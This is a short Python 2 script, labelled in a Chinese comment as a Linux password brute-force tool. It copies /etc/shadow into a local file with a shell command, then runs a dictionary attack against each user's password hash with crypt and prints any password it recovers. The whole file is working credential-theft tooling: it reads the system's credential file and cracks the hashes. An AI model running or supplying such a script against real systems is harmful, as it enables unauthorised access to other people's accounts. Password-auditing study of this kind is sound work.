#!/usr/bin/env python
#encoding=utf-8
#  linux密码爆破工具 by daige
import  crypt
import  os

def testPass(cryptPass):
    head = cryptPass[0:11]

    if '$2a' in cryptPass:
        head = cryptPass[0:12]
    
    dictFile = open('dict.txt','r')

    for word in dictFile.readlines():
        word = word.strip('\n')
        cryptWord = crypt.crypt(word,head)

        if (cryptWord == cryptPass):
            print "[+] Found Password:"+word+'\n'
            return 
    
    print "[-] Password Not Found.\n"
    return

def main():
    os.system("cat /etc/shadow > pass.txt")
    passFile = open('pass.txt')
    for line in passFile.readlines():
        if ":" in line:
            user = line.split(':')[0]
            cryptPass = line.split(':')[1].strip(' ')
            
            print "[*] Cracking Password For:" + user
            testPass(cryptPass)

if __name__ == '__main__':
    main()
